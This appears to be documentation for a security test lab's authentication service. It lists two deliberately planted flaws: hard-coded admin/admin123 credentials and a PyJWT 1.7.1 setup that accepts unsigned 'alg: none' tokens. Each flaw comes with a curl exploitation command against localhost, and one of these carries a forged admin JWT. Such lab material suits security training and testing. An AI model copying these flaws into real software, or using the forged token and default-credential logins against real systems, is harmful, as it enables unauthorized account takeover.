# Authentication Service — Planted Vulnerabilities

## Service Info
- **Container name:** `sentinelmesh-authservice`
- **Internal port:** `5001`
- **Base image:** `python:3.11-slim`
- **Structured log path:** `/var/log/sentinelmesh/auth_events.log` (emits `login_attempt` and `jwt_verification` JSON-lines events)

## Vulnerability 1: Default Credentials (`admin` / `admin123`)
- **Scenario #:** S3
- **Type:** CWE-798 (Use of Hard-coded Credentials)
- **Location:** `services/authservice/app.py:63` and `services/database/init.sql:21`
- **Description:** The database is initialized with default administrator credentials (`admin` / `admin123`). The `/auth/login` endpoint validates these credentials against PostgreSQL and issues a signed JWT token on success.
- **Exploitation example:**
  ```bash
  curl -X POST http://127.0.0.1:5001/auth/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "admin123"}'
  ```
- **Expected result:** HTTP 200 OK response returning a JSON object containing a valid JWT token: `{"status": "success", "token": "<JWT_TOKEN_STRING>"}`.

## Vulnerability 2: Vulnerable PyJWT Dependency (CVE-2022-29217 / Algorithm Confusion)
- **Scenario #:** S4
- **Type:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)
- **Location:** `services/authservice/requirements.txt:2` and `services/authservice/app.py:136`
- **Description:** The service pins `PyJWT==1.7.1` (which contains CVE-2022-29217) and calls `jwt.decode(token, JWT_SECRET)` without specifying allowed algorithms. An attacker can construct a JWT with `{"alg": "none"}` or HMAC with public key to bypass signature verification.
- **Exploitation example:**
  ```bash
  curl -X POST http://127.0.0.1:5001/auth/verify -H "Content-Type: application/json" -d '{"token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."}'
  ```
- **Expected result:** HTTP 200 OK response returning `{"status": "valid", "payload": {"user_id": 1, "username": "admin", "role": "admin"}}` despite signature verification failure or `none` algorithm.
